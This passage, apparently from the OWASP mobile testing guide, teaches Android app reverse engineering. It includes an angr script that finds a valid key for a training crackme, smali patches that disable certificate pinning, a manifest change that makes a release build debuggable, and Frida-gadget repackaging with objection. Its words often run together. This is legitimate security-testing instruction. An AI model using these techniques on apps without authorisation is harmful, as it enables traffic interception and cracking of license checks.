Note: InstantappsrequireanAppBundle. AppBundlesaredescribedinthe“AppBundles”sectionofthe“AndroidPlatform Overview”chapter. StaticAnalysisConsiderations: 112\nStaticanalysiscanbeeitherdoneafterreverseengineeringadownloadedinstantapp,orbyanalyzingtheAppBundle. WhenyouanalyzetheAppBundle,checktheAndroidManifesttoseewhetherdist:moduledist:instant="true"isset foragivenmodule(eitherthebaseoraspecificmodulewithdist:moduleset). Next,checkforthevariousentrypoints, whichentrypointsareset(bymeansof<data android:path="</PATH/HERE>" />). Nowfollowtheentrypoints,likeyouwoulddoforanyActivityandcheck: • Isthereanydataretrievedbytheappwhichshouldrequireprivacyprotectionofthatdata? Ifso,areallrequired controlsinplace? • Areallcommunicationssecured? • Whenyouneedmorefunctionalities,aretherightsecuritycontrolsdownloadedaswell? DynamicAnalysisConsiderations: Therearemultiplewaystostartthedynamicanalysisofyourinstantapp. Inallcases, youwillfirsthavetoinstallthe supportforinstantappsandaddtheiaexecutabletoyour$PATH. Theinstallationofinstantappsupportistakencareoffthroughthefollowingcommand: cdpath/to/android/sdk/tools/bin && ./sdkmanager 'extras;google;instantapps' Next,youhavetoaddpath/to/android/sdk/extras/google/instantapps/iatoyour$PATH. Afterthepreparation, youcantestinstantappslocallyonadevicerunningAndroid8.1(APIlevel27)orlater. Theapp canbetestedindifferentways: • Testtheapplocally: DeploytheappviaAndroidStudio(andenabletheDeploy as instant appcheckboxinthe Run/Configurationdialog)ordeploytheappusingthefollowingcommand: iarun output-from-build-command <app-artifact> • TesttheappusingthePlayConsole: 1. UploadyourAppBundletotheGooglePlayConsole 2. Preparetheuploadedbundleforareleasetotheinternaltesttrack. 3. Signintoaninternaltesteraccountonadevice,thenlaunchyourinstantexperiencefromeitheranexternal preparedlinkorviathetry nowbuttonintheAppstorefromthetestersaccount. Nowthatyoucantesttheapp,checkwhether: • Thereareanydatawhichrequireprivacycontrolsandwhetherthesecontrolsareinplace. • Allcommunicationsaresufficientlysecured. • Whenyouneedmorefunctionalities,aretherightsecuritycontrolsdownloadedaswellforthesefunctionalities? Exploring the App Package Platform: android Onceyouhavecollectedthepackagenameoftheapplicationyouwanttotarget,you’llwanttostartgatheringinformation aboutit. First,retrievetheAPKasexplainedin“BasicTestingOperations-ObtainingandExtractingApps”. APK files are actually ZIP files that can be unpacked using a standard decompression utility such as unzip. However, we recommend using apktool which additionally decodes the AndroidManifest.xml and disassembles the app binaries (classes.dex)tosmalicode: $apktooldUnCrackable-Level3.apk $tree . ├──AndroidManifest.xml ├──apktool.yml ├──lib ├──original │ ├──AndroidManifest.xml │ └──META-INF │ ├──CERT.RSA │ ├──CERT.SF 113\n│ └──MANIFEST.MF ├──res ... └──smali Thefollowingfilesareunpacked: • AndroidManifest.xml: containsthedefinitionoftheapp’spackagename, targetandminimumAPIlevel,appcon- figuration,appcomponents,permissions,etc. • original/META-INF:containstheapp’smetadata – MANIFEST.MF:storeshashesoftheappresources – CERT.RSA:theapp’scertificate(s) – CERT.SF:listofresourcesandtheSHA-1digestofthecorrespondinglinesintheMANIFEST.MFfile • assets: directorycontainingappassets(filesusedwithintheAndroidapp,suchasXMLfiles,JavaScriptfiles,and pictures),whichtheAssetManagercanretrieve • classes.dex: classescompiledintheDEXfileformat,thatDalvikvirtualmachine/AndroidRuntimecanprocess. DEX isJavabytecodefortheDalvikVirtualMachine. Itisoptimizedforsmalldevices • lib: directorycontaining3rdpartylibrariesthatarepartoftheAPK • res: directorycontainingresourcesthathaven’tbeencompiledintoresources.arsc • resources.arsc: filecontainingprecompiledresources,suchasXMLfilesforthelayout AsunzippingwiththestandardunziputilityleavessomefilessuchastheAndroidManifest.xmlunreadable,it’sbetter tounpacktheAPKusingapktool. $ls -alh total32 drwxr-xr-x 9sven staff 306BDec 516:29. drwxr-xr-x 5sven staff 170BDec 516:29.. -rw-r--r-- 1sven staff 10KDec 516:29AndroidManifest.xml -rw-r--r-- 1sven staff 401BDec 516:29apktool.yml drwxr-xr-x 6sven staff 204BDec 516:29assets drwxr-xr-x 3sven staff 102BDec 516:29lib drwxr-xr-x 4sven staff 136BDec 516:29original drwxr-xr-x 131sven staff 4.3KDec 516:29res drwxr-xr-x 9sven staff 306BDec 516:29smali The Android Manifest TheAndroidManifestisthemainsourceofinformation, itincludesalotofinterestinginformationsuchasthepackage name,thepermissions,appcomponents,etc. Here’sanon-exhaustivelistofsomeinfoandthecorrespondingkeywordsthatyoucaneasilysearchforintheAndroid Manifestbyjustinspectingthefileorbyusinggrep -i <keyword> AndroidManifest.xml: • Apppermissions: permission(see“AndroidPlatformAPIs”) • Backupallowance: android:allowBackup(see“DataStorageonAndroid • App components: activity, service, provider, receiver (see “Android Platform APIs” and “Data Storage on Android • Debuggableflag: debuggable(see“CodeQualityandBuildSettingsofAndroidApps”) Pleaserefertothementionedchapterstolearnmoreabouthowtotesteachofthesepoints. App Binary Theappbinary(classes.dex)canbefoundintherootdirectoryoftheapppackage. Itisaso-calledDEX(DalvikExe- cutable)filethatcontainscompiledJavacode. Duetoitsnature,afterapplyingsomeconversionsyou’llbeabletousea decompilertoproduceJavacode. We’vealsoseenthefoldersmalithatwasobtainedafterwerunapktool. Thiscontains thedisassembledDalvikbytecodeinanintermediatelanguagecalledsmali, whichisahuman-readablerepresentation oftheDalvikexecutable. Refertothesection“ReviewingDecompiledJavaCode”inthechapter“TamperingandReverseEngineeringonAndroid” formoreinformationabouthowtoreverseengineerDEXfiles. 114\nCompiled App Binary Insomecasesitmightbeusefultoretrievethecompiledappbinary(.odex). Firstgetthepathtotheapp’sdatadirectory: adbshellpmpathcom.example.myapplication package:/data/app/~~DEMFPZh7R4qfUwwwh1czYA==/com.example.myapplication-pOslqiQkJclb_1Vk9-WAXg==/base.apk Remove the /base.apk part, add /oat/arm64/base.odex and use the resulting path to pull the base.odex from the device: adbroot adbpull/data/app/~~DEMFPZh7R4qfUwwwh1czYA==/com.example.myapplication-pOslqiQkJclb_1Vk9-WAXg==/oat/arm64/base.odex NotethattheexactdirectorywillbedifferentbasedonyourAndroidversion. Ifthe/oat/arm64/base.odexfilecan’tbe found,manuallysearchinthedirectoryreturnedbypm path. Native Libraries YoucaninspectthelibfolderintheAPK: $ls -1lib/armeabi/ libdatabase_sqlcipher.so libnative.so libsqlcipher_android.so libstlport_shared.so orfromthedevicewithobjection: ...g.vp.owasp_mobile.omtg_androidon (google:8.1.0)[usb] #lslib Type ... Name ------ ... ------------------------ File ... libnative.so File ... libdatabase_sqlcipher.so File ... libstlport_shared.so File ... libsqlcipher_android.so For now this is all information you can get about the native libraries unless you start reverse engineering them, which isdoneusingadifferentapproachthantheoneusedtoreversetheappbinaryasthiscodecannotbedecompiledbut only disassembled. Refer to the section “Reviewing Disassemble Native Code” in the chapter “Tampering and Reverse EngineeringonAndroid”formoreinformationabouthowtoreverseengineertheselibraries. Other App Resources ItisnormallyworthtakingalookattherestoftheresourcesandfilesthatyoumayfindintherootfolderoftheAPKas sometimestheycontainadditionalgoodieslikekeystores,encrypteddatabases,certificates,etc. Symbolic Execution Platform: android Symbolicexecutionisaveryusefultechniquetohaveinyourtoolbox,especiallywhiledealingwithproblemswhereyou needtofindacorrectinputforreachingacertainblockofcode. Inthissection,wewillsolveasimpleAndroidcrackme byusingtheAngrbinaryanalysisframeworkasoursymbolicexecutionengine. Todemonstratethistechniquewe’lluseacrackmecalledAndroidLicenseValidator. ThecrackmeconsistsofasingleELF executablefile,whichcanbeexecutedonanyAndroiddevicebyfollowingtheinstructionsbelow: 115\n$adbpushvalidate/data/local/tmp [100%]/data/local/tmp/validate $adbshellchmod755/data/local/tmp/validate $adbshell/data/local/tmp/validate Usage:./validate <serial> $adbshell/data/local/tmp/validate12345 Incorrectserial (wrongformat). Sofarsogood,butweknownothingaboutwhatavalidlicensekeylookslike. Togetstarted,opentheELFexecutable inadisassemblersuchasiaito. Themainfunctionislocatedatoffset0x00001874inthedisassembly. Itisimportantto notethatthisbinaryisPIE-enabled,andiaitochoosestoloadthebinaryat0x0asimagebaseaddress. 116\nThefunctionnameshavebeenstrippedfromthebinary,butluckilythereareenoughdebuggingstringstoprovideusa contexttothecode. Movingforward,wewillstartanalyzingthebinaryfromtheentryfunctionatoffset0x00001874,and keepanoteofalltheinformationeasilyavailabletous. Duringthisanalysis,wewillalsotrytoidentifythecoderegions whicharesuitableforsymbolicexecution. 117\nstrleniscalledatoffset0x000018a8, andthereturnedvalueiscomparedto0x10atoffset0x000018b0. Immediately afterthat,theinputstringispassedtoaBase32decodingfunctionatoffset0x00001340. Thisprovidesuswithvaluable informationthattheinputlicensekeyisaBase32-encoded16-characterstring(whichtotals10bytesinraw). Thedecoded inputisthenpassedtothefunctionatoffset0x00001760,whichvalidatesthelicensekey. Thedisassemblyofthisfunction isshownbelow. Wecannowusethisinformationabouttheexpectedinputtofurtherlookintothevalidationfunctionat0x00001760. ╭(fcn)fcn.00001760 268 │ fcn.00001760 (int32_targ1); │ ;varint32_tvar_20h@fp-0x20 │ ;varint32_tvar_14h@fp-0x14 │ ;varint32_tvar_10h@fp-0x10 │ ;argint32_targ1@r0 │ ;CALLXREFfromfcn.00001760(+0x1c4) │ 0x00001760 push {r4,fp,lr} │ 0x00001764 addfp,sp,8 │ 0x00001768 subsp,sp,0x1c │ 0x0000176c strr0,[var_20h] ;0x20;"$!";arg1 │ 0x00001770 ldrr3,[var_20h] ;0x20;"$!";entry.preinit0 │ 0x00001774 strr3,[var_10h] ;str. │ ;0x10 │ 0x00001778 movr3,0 │ 0x0000177c strr3,[var_14h] ;0x14 │ ╭─<0x00001780 b0x17d0 │ │ ;CODEXREFfromfcn.00001760(0x17d8) │ ╭──>0x00001784 ldrr3,[var_10h] ;str. │ │ ;0x10;entry.preinit0 │ ╎│ 0x00001788 ldrbr2,[r3] │ ╎│ 0x0000178c ldrr3,[var_10h] ;str. │ ╎│ ;0x10;entry.preinit0 │ ╎│ 0x00001790 addr3,r3,1 │ ╎│ 0x00001794 ldrbr3,[r3] │ ╎│ 0x00001798 eorr3,r2,r3 │ ╎│ 0x0000179c andr2,r3,0xff │ ╎│ 0x000017a0 mvnr3,0xf │ ╎│ 0x000017a4 ldrr1,[var_14h] ;0x14;entry.preinit0 │ ╎│ 0x000017a8 subr0,fp,0xc │ ╎│ 0x000017ac addr1,r0,r1 │ ╎│ 0x000017b0 addr3,r1,r3 118\n│ ╎│ 0x000017b4 strbr2,[r3] │ ╎│ 0x000017b8 ldrr3,[var_10h] ;str. │ ╎│ ;0x10;entry.preinit0 │ ╎│ 0x000017bc addr3,r3,2 ;"ELF\x01\x01\x01";aav.0x00000001 │ ╎│ 0x000017c0 strr3,[var_10h] ;str. │ ╎│ ;0x10 │ ╎│ 0x000017c4 ldrr3,[var_14h] ;0x14;entry.preinit0 │ ╎│ 0x000017c8 addr3,r3,1 │ ╎│ 0x000017cc strr3,[var_14h] ;0x14 │ ╎│ ;CODEXREFfromfcn.00001760(0x1780) │ ╎╰─>0x000017d0 ldrr3,[var_14h] ;0x14;entry.preinit0 │ ╎ 0x000017d4 cmpr3,4 ;aav.0x00000004;aav.0x00000001;aav.0x00000001 │ ╰──<0x000017d8 ble0x1784 ;likely │ 0x000017dc ldrbr4,[fp,-0x1c] ;"4" │ 0x000017e0 blfcn.000016f0 │ 0x000017e4 movr3,r0 │ 0x000017e8 cmpr4,r3 │ ╭─<0x000017ec bne0x1854 ;likely │ │ 0x000017f0 ldrbr4,[fp,-0x1b] │ │ 0x000017f4 blfcn.0000170c │ │ 0x000017f8 movr3,r0 │ │ 0x000017fc cmpr4,r3 │ ╭──<0x00001800 bne0x1854 ;likely │ ││ 0x00001804 ldrbr4,[fp,-0x1a] │ ││ 0x00001808 blfcn.000016f0 │ ││ 0x0000180c movr3,r0 │ ││ 0x00001810 cmpr4,r3 │ ╭───<0x00001814 bne0x1854 ;likely │ │││ 0x00001818 ldrbr4,[fp,-0x19] │ │││ 0x0000181c blfcn.00001728 │ │││ 0x00001820 movr3,r0 │ │││ 0x00001824 cmpr4,r3 │ ╭────<0x00001828 bne0x1854 ;likely │ ││││ 0x0000182c ldrbr4,[fp,-0x18] │ ││││ 0x00001830 blfcn.00001744 │ ││││ 0x00001834 movr3,r0 │ ││││ 0x00001838 cmpr4,r3 │ ╭─────<0x0000183c bne0x1854 ;likely │ │││││ 0x00001840 ldrr3,[0x0000186c] ;[0x186c:4]=0x270section..hash;section..hash │ │││││ 0x00001844 addr3,pc,r3 ;0x1abc;"Productactivationpassed.Congratulations!" │ │││││ 0x00001848 movr0,r3 ;0x1abc;"Productactivationpassed.Congratulations!"; │ │││││ 0x0000184c blsym.imp.puts ;intputs(constchar*s) │ │││││ ;intputs("Productactivationpassed.Congratulations!") │ ╭──────<0x00001850 b0x1864 │ ││││││ ;CODEXREFSfromfcn.00001760(0x17ec,0x1800,0x1814,0x1828,0x183c) │ │╰╰╰╰╰─>0x00001854 ldrr3,aav.0x00000288 ;[0x1870:4]=0x288aav.0x00000288 │ │ 0x00001858 addr3,pc,r3 ;0x1ae8;"Incorrectserial."; │ │ 0x0000185c movr0,r3 ;0x1ae8;"Incorrectserial."; │ │ 0x00001860 blsym.imp.puts ;intputs(constchar*s) │ │ ;intputs("Incorrectserial.") │ │ ;CODEXREFfromfcn.00001760(0x1850) │ ╰──────>0x00001864 subsp,fp,8 ╰ 0x00001868 pop{r4,fp,pc} ;entry.preinit0;entry.preinit0; Discussingalltheinstructionsinthefunctionisbeyondthescopeofthischapter,insteadwewilldiscussonlytheimportant pointsneededfortheanalysis. Inthevalidationfunction, thereisalooppresentat0x00001784whichperformsaXOR operationatoffset0x00001798. Theloopismoreclearlyvisibleinthegraphviewbelow. 119\nXORisaverycommonlyusedtechniquetoencryptinformationwhereobfuscationisthegoalratherthansecurity. XOR shouldnotbeusedforanyseriousencryption,asitcanbecrackedusingfrequencyanalysis. Therefore,themere presenceofXORencryptioninsuchavalidationlogicalwaysrequiresspecialattentionandanalysis. Movingforward,atoffset0x000017dc,theXORdecodedvalueobtainedfromaboveisbeingcomparedagainstthereturn valuefromasub-functioncallat0x000017e8. Clearlythisfunctionisnotcomplex,andcanbeanalyzedmanually,butstillremainsacumbersometask. Especiallywhile 120\nworking on a big code base, time can be a major constraint, and it is desirable to automate such analysis. Dynamic symbolic execution is helpful in exactly those situations. In the above crackme, the symbolic execution engine can determinetheconstraintsoneachbyteoftheinputstringbymappingapathbetweenthefirstinstructionofthelicense check(at0x00001760)andthecodethatprintsthe“Productactivationpassed”message(at0x00001840). Theconstraintsobtainedfromtheabovestepsarepassedtoasolverengine,whichfindsaninputthatsatisfiesthem-a validlicensekey. YouneedtoperformseveralstepstoinitializeAngr’ssymbolicexecutionengine: • LoadthebinaryintoaProject,whichisthestartingpointforanykindofanalysisinAngr. • Passtheaddressfromwhichtheanalysisshouldstart. Inthiscase,wewillinitializethestatewiththefirstinstruction oftheserialvalidationfunction. Thismakestheproblemsignificantlyeasiertosolvebecauseyouavoidsymbolically executingtheBase32implementation. • Passtheaddressofthecodeblockthattheanalysisshouldreach. Inthiscase,that’stheoffset0x00001840,where thecoderesponsibleforprintingthe“Productactivationpassed”messageislocated. • Also,specifytheaddressesthattheanalysisshouldnotreach. Inthiscase,thecodeblockthatprintsthe“Incorrect serial”messageat0x00001854isnotinteresting. NotethattheAngrloaderwillloadthePIEexecutablewithabaseaddressof0x400000,whichneedstobeadded totheoffsetsfromiaitobeforepassingittoAngr. Thefinalsolutionscriptispresentedbelow: importangr #Version:9.2.2 importbase64 load_options ={} b=angr.Project("./validate",load_options =load_options) ##Thekeyvalidationfunctionstartsat0x401760,sothat'swherewecreatetheinitialstate. ##Thisspeedsthingsupalotbecausewe'rebypassingtheBase32-encoder. options ={ angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS, } state =b.factory.blank_state(addr=0x401760,add_options=options) simgr =b.factory.simulation_manager(state) simgr.explore(find=0x401840,avoid=0x401854) ##0x401840=Productactivationpassed ##0x401854=Incorrectserial found =simgr.found[0] ##Getthesolutionstringfrom*(R11-0x20). addr =found.memory.load(found.regs.r11 -0x20,1,endness="Iend_LE") concrete_addr =found.solver.eval(addr) solution =found.solver.eval(found.memory.load(concrete_addr,10),cast_to=bytes) print(base64.b32encode(solution)) 121\nAs discussed previously in the section “Dynamic Binary Instrumentation”, the symbolic execution engine constructs a binary tree of the operations for the program input given and generates a mathematical equation for each possible paththatmightbetaken. Internally,Angrexploresallthepathsbetweenthetwopointsspecifiedbyus,andpassesthe correspondingmathematicalequationstothesolvertoreturnmeaningfulconcreteresults. Wecanaccessthesesolutions viasimulation_manager.foundlist,whichcontainsallthepossiblepathsexploredbyAngrwhichsatisfiesourspecified searchcriteria. Take a closer look at the latter part of the script where the final solution string is being retrieved. The address of the string is obtained from address r11 - 0x20. This may appear magical at first, but a careful analysis of the function at 0x00001760holdstheclue,asitdeterminesifthegiveninputstringisavalidlicensekeyornot. Inthedisassemblyabove, youcanseehowtheinputstringtothefunction(inregisterR0)isstoredintoalocalstackvariable0x0000176c str r0,[var_20h]. Hence,wedecidedtousethisvaluetoretrievethefinalsolutioninthescript. Usingfound.solver.eval youcanaskthesolverquestionslike“giventheoutputofthissequenceofoperations(thecurrentstateinfound),what musttheinput(ataddr)havebeen?”. InARMv7,R11iscalledfp(functionpointer),thereforeR11 - 0x20isequivalenttofp-0x20: var int32_t var_20h @ fp-0x20 Next,theendnessparameterinthescriptspecifiesthatthedataisstoredin“little-endian”fashion,whichisthecasefor almostalloftheAndroiddevices. Also, it may appear as if the script is simply reading the solution string from the memory of the script. However, it’s readingitfromthesymbolicmemory. Neitherthestringnorthepointertothestringactuallyexist. Thesolverensures thatthesolutionitprovidesisthesameasiftheprogramwouldbeexecutedtothatpoint. Runningthisscriptshouldreturnthefollowingoutput: $python3solve.py WARNING |...|cle.loader |Themainbinaryisaposition-independentexecutable.Itisbeingloadedwithabaseaddressof0x400000. b'JACE6ACIARNAAIIA' NowyoucanrunthevalidatebinaryinyourAndroiddevicetoverifythesolutionasindicatedhere. Youmayobtaindifferentsolutionsusingthescript,astherearemultiplevalidlicensekeyspossible. To conclude, learning symbolic execution might look a bit intimidating at first, as it requires deep understanding and extensive practice. However, the effort is justified considering the valuable time it can save in contrast to analyzing complexdisassembledinstructionsmanually. Typicallyyou’dusehybridtechniques,asintheaboveexample,wherewe performed manual analysis of the disassembled code to provide the correct criteria to the symbolic execution engine. PleaserefertotheiOSchapterformoreexamplesonAngrusage. Patching Platform: android MakingsmallchangestotheAndroidManifestorbytecodeisoftenthequickestwaytofixsmallannoyancesthatprevent youfromtestingorreverseengineeringanapp. OnAndroid,twoissuesinparticularhappenregularly: 1. Youcan’tinterceptHTTPStrafficwithaproxybecausetheappemploysSSLpinning. 2. Youcan’tattachadebuggertotheappbecausetheandroid:debuggableflagisnotsetto"true"intheAndroid Manifest. In most cases, both issues can be fixed by making minor changes to the app (aka. patching) and then re-signing and repackagingit. AppsthatrunadditionalintegritychecksbeyonddefaultAndroidcode-signingareanexception. Inthose cases,youhavetopatchtheadditionalchecksaswell. ThefirststepisunpackinganddisassemblingtheAPKwithapktool: 122\napktooldtarget_apk.apk Note: To save time, you may use the flag --no-src if you only want to unpack the APK but not disassemble the code. Forexample,whenyouonlywanttomodifytheAndroidManifestandrepackimmediately. Patching Example: Disabling Certificate Pinning Certificate pinning is an issue for security testers who want to intercept HTTPS communication for legitimate reasons. PatchingbytecodetodeactivateSSLpinningcanhelpwiththis. Todemonstratebypassingcertificatepinning,we’llwalk throughanimplementationinanexampleapplication. Onceyou’veunpackedanddisassembledtheAPK,it’stimetofindthecertificatepinningchecksintheSmalisourcecode. Searchingthecodeforkeywordssuchas“X509TrustManager”shouldpointyouintherightdirection. Inourexample,asearchfor“X509TrustManager”returnsoneclassthatimplementsacustomTrustManager. Thederived classimplementsthemethodscheckClientTrusted,checkServerTrusted,andgetAcceptedIssuers. To bypass the pinning check, add the return-void opcode to the first line of each method. This opcode causes the checkstoreturnimmediately. Withthismodification,nocertificatechecksareperformed,andtheapplicationacceptsall certificates. .methodpubliccheckServerTrusted([LJava/security/cert/X509Certificate;Ljava/lang/String;)V .locals3 .paramp1,"chain" #[Ljava/security/cert/X509Certificate; .paramp2,"authType" #Ljava/lang/String; .prologue return-void #<--OURINSERTEDOPCODE! .line102 iget-objectv1,p0,Lasdf/t$a;->a:Ljava/util/ArrayList; invoke-virtual{v1},Ljava/util/ArrayList;->iterator()Ljava/util/Iterator; move-result-objectv1 :goto_0 invoke-interface{v1},Ljava/util/Iterator;->hasNext()Z This modification will break the APK signature, so you’ll also have to re-sign the altered APK archive after repackaging it. Patching Example: Making an App Debuggable Every debugger-enabled process runs an extra thread for handling JDWP protocol packets. This thread is started only forappsthathavetheandroid:debuggable="true"flagsetintheirmanifestfile’s<application>element. Thisisthe typicalconfigurationofAndroiddevicesshippedtoendusers. When reverse engineering apps, you’ll often have access to the target app’s release build only. Release builds aren’t meanttobedebugged,that’sthepurposeofdebugbuilds. Ifthesystempropertyro.debuggableissetto“0”,Android disallowsbothJDWPandnativedebuggingofreleasebuilds. Althoughthisiseasytobypass,you’restilllikelytoencounter limitations,suchasalackoflinebreakpoints. Nevertheless,evenanimperfectdebuggerisstillaninvaluabletool,being abletoinspecttheruntimestateofaprogrammakesunderstandingtheprogramaloteasier. Toconvert areleasebuildintoadebuggablebuild, youneedtomodifyaflagintheAndroidManifestfile(AndroidMani- fest.xml). Onceyou’veunpackedtheapp(e.g.apktoold--no-srcUnCrackable-Level1.apk)anddecodedtheAndroid Manifest,addandroid:debuggable="true"toitusingatexteditor: <application android:allowBackup="true" android:debuggable="true" android:icon="@drawable/ic_launcher" android:label="@string/app_name" ↪ android:name="com.xxx.xxx.xxx" android:theme="@style/AppTheme"> Evenifwehaven’talteredthesourcecode,thismodificationalsobreakstheAPKsignature,soyou’llalsohavetore-sign thealteredAPKarchive. 123\nPatching React Native applications IftheReactNativeframeworkhasbeenusedfordevelopingthenthemainapplicationcodeislocatedinthefileassets/ index.android.bundle. ThisfilecontainstheJavaScriptcode. Mostofthetime,theJavaScriptcodeinthisfileisminified. ByusingthetoolJStilleryahumanreadableversionofthefilecanberetrieved,allowingcodeanalysis. TheCLIversion ofJStilleryorthelocalservershouldbepreferredinsteadofusingtheonlineversionasotherwisesourcecodeissentand disclosedtoa3rdparty. ThefollowingapproachcanbeusedinordertopatchtheJavaScriptfile: 1. UnpacktheAPKarchiveusingapktooltool. 2. Copythecontentofthefileassets/index.android.bundleintoatemporaryfile. 3. UseJStillerytobeautifyanddeobfuscatethecontentofthetemporaryfile. 4. Identifywherethecodeshouldbepatchedinthetemporaryfileandimplementthechanges. 5. Putthepatchedcodeonasinglelineandcopyitintheoriginalassets/index.android.bundlefile. 6. RepacktheAPKarchiveusingapktooltoolandsignitbeforeinstallingitonthetargetdevice/emulator. Retrieving Strings Platform: android While performing any kind of binary analysis, strings can be considered as one of the most valuable starting points as they provide context. For example, an error log string like “Data encryption failed.” gives us a hint that the adjoining codemightberesponsibleforperformingsomekindofencryptionoperation. Java and Kotlin Bytecode As we already know, all the Java and Kotlin bytecode of an Android application is compiled into a DEX file. Each DEX filecontainsalistofstringidentifiers(strings_ids),whichcontainsallthestringidentifiersusedinthebinarywhenevera stringisreferred,includinginternalnaming(e.g,typedescriptors)orconstantobjectsreferredbythecode(e.ghardcoded strings). YoucansimplydumpthislistusingtoolssuchasGhidra(GUIbased)orDextra(CLIbased). With Ghidra, strings can be obtained by simply loading the DEX file and selectingWindow -> Defined strings in the menu. LoadinganAPKfiledirectlyintoGhidramightleadtoinconsistencies. ThusitisrecommendedtoextracttheDEX filebyunzippingtheAPKfileandthenloadingitintoGhidra. 124\nWithDextra,youcandumpallthestringsusingthefollowingcommand: dextra -Sclasses.dex TheoutputfromDextracanbemanipulatedusingstandardLinuxcommands,forexample,usinggreptosearchforcertain keywords. Itisimportanttoknow,thelistofstringsobtainedusingtheabovetoolscanbeverybig,asitalsoincludesthevarious classandpackagenamesusedintheapplication. Goingthroughthecompletelist,speciallyforbigbinaries,canbevery cumbersome. Thus,itisrecommendedtostartwithkeyword-basedsearchingandgothroughthelistonlywhenkeyword searchdoesnothelp. Somegenerickeywordswhichcanbeagoodstartingpointare-password,key,andsecret. Other usefulkeywordsspecifictothecontextoftheappcanbeobtainedwhileyouareusingtheappitself. Forinstance,imagine thattheapphasasloginform,youcantakenoteofthedisplayedplaceholderortitletextoftheinputfieldsandusethat asanentrypointforyourstaticanalysis. Native Code In order to extract strings from native code used in an Android application, you can use GUI tools such as Ghidra or iaitoorrelyonCLI-basedtoolssuchasthestringsUnixutility(strings <path_to_binary>)orradare2’srabin2(rabin2 -zz <path_to_binary>). When using the CLI-based ones you can take advantage of other tools such as grep (e.g. in conjunctionwithregularexpressions)tofurtherfilterandanalyzetheresults. Accessing App Data Directories 125\nPlatform: android Onceyouhaveinstalledtheapp,thereisfurtherinformationtoexplore,wheretoolslikeobjectioncomeinhandy. Whenusingobjectionyoucanretrievedifferentkindsofinformation,whereenvwillshowyouallthedirectoryinformation oftheapp. $objection -gsg.vp.owasp_mobile.omtg_androidexplore ...g.vp.owasp_mobile.omtg_androidon (google:8.1.0)[usb] #env Name Path ---------------------- --------------------------------------------------------------------------- cacheDirectory /data/user/0/sg.vp.owasp_mobile.omtg_android/cache codeCacheDirectory /data/user/0/sg.vp.owasp_mobile.omtg_android/code_cache externalCacheDirectory /storage/emulated/0/Android/data/sg.vp.owasp_mobile.omtg_android/cache filesDirectory /data/user/0/sg.vp.owasp_mobile.omtg_android/files obbDir /storage/emulated/0/Android/obb/sg.vp.owasp_mobile.omtg_android packageCodePath /data/app/sg.vp.owasp_mobile.omtg_android-kR0ovWl9eoU_yh0jPJ9caQ==/base.apk Amongthisinformationwefind: • Theinternaldatadirectory(aka. sandboxdirectory)whichisat/data/data/[package-name]or/data/user/0/[ package-name] • Theexternaldatadirectoryat/storage/emulated/0/Android/data/[package-name]or/sdcard/Android/data/ [package-name] • Thepathtotheapppackagein/data/app/ Theinternaldatadirectoryisusedbytheapptostoredatacreatedduringruntimeandhasthefollowingbasicstructure: ...g.vp.owasp_mobile.omtg_androidon (google:8.1.0) [usb] #ls Type ... Name --------- ... ------------------- Directory ... cache Directory ... code_cache Directory ... lib Directory ... shared_prefs Directory ... files Directory ... databases Readable:True Writable:True Eachfolderhasitsownpurpose: • cache: Thislocationisusedfordatacaching. Forexample,theWebViewcacheisfoundinthisdirectory. • code_cache:Thisisthelocationofthefilesystem’sapplication-specificcachedirectorydesignedforstoringcached code. OndevicesrunningAndroid5.0(APIlevel21)orlater,thesystemwilldeleteanyfilesstoredinthislocation whentheapportheentireplatformisupgraded. • lib: This folder stores native libraries written in C/C++. These libraries can have one of several file extensions, including.soand.dll(x86support). Thisfoldercontainssubdirectoriesfortheplatformstheapphasnativelibraries for,including – armeabi: compiledcodeforallARM-basedprocessors – armeabi-v7a: compiledcodeforallARM-basedprocessors,version7andaboveonly – arm64-v8a: compiledcodeforall64-bitARM-basedprocessors,version8andabovebasedonly – x86: compiledcodeforx86processorsonly – x86_64: compiledcodeforx86_64processorsonly – mips: compiledcodeforMIPSprocessors • shared_prefs: ThisfoldercontainsanXMLfilethatstoresvaluessavedviatheSharedPreferencesAPIs. • files: Thisfolderstoresregularfilescreatedbytheapp. • databases: ThisfolderstoresSQLitedatabasefilesgeneratedbytheappatruntime,e.g.,userdatafiles. However,theappmightstoremoredatanotonlyinsidethesefoldersbutalsointheparentfolder(/data/data/[package- name]). Refertothe“TestingDataStorage”chapterformoreinformationandbestpracticesonsecurelystoringsensitivedata. 126\nDynamic Analysis on Non-Rooted Devices Platform: android Non-rooteddeviceshavethebenefitofreplicatinganenvironmentthattheapplicationisintendedtorunon. Thankstotoolslikeobjection,youcanpatchtheappinordertotestitlikeifyouwereonarooteddevice(butofcourse being jailed to that one app). To do that you have to perform one additional step: patch the APK to include the Frida gadgetlibrary. Nowyoucanuseobjectiontodynamicallyanalyzetheapplicationonnon-rooteddevices. ThefollowingcommandssummarizehowtopatchandstartdynamicanalysisusingobjectionusingtheUnCrackableApp forAndroidLevel1asanexample: ##DownloadtheUncrackableAPK $wgethttps://raw.githubusercontent.com/OWASP/owasp-mastg/master/Crackmes/Android/Level_01/UnCrackable-Level1.apk ##PatchtheAPKwiththeFridaGadget $objectionpatchapk --source UnCrackable-Level1.apk ##InstallthepatchedAPKontheandroidphone $adbinstallUnCrackable-Level1.objection.apk ##Afterrunningthemobilephone,objectionwilldetecttherunningfrida-serverthroughtheAPK $objectionexplore Static Analysis on Android Platform: android Bypassing Certificate Pinning Platform: android SomeapplicationswillimplementSSLPinning,whichpreventstheapplicationfromacceptingyourinterceptingcertificate asavalidcertificate. Thismeansthatyouwillnotbeabletomonitorthetrafficbetweentheapplicationandtheserver. Formostapplications,certificatepinningcanbebypassedwithinseconds,butonlyiftheappusestheAPIfunctionsthat arecoveredbythesetools. IftheappisimplementingSSLPinningwithacustomframeworkorlibrary,theSSLPinning mustbemanuallypatchedanddeactivated,whichcanbetime-consuming. ThissectiondescribesvariouswaystobypassSSLPinningandgivesguidanceaboutwhatyoushoulddowhentheexisting toolsdon’thelp. Bypassing Methods Thereareseveralwaystobypasscertificatepinningforablackboxtest,dependingontheframeworksavailableonthe device: • CydiaSubstrate: InstalltheAndroid-SSL-TrustKillerpackage. • Frida: Usethefrida-multiple-unpinningscript. • Objection: Usetheandroid sslpinning disablecommand. • Xposed: InstalltheTrustMeAlreadyorSSLUnpinningmodule. If you have a rooted device with frida-server installed, you can bypass SSL pinning by running the following Objection command(repackageyourappifyou’reusinganon-rooteddevice): androidsslpinningdisable 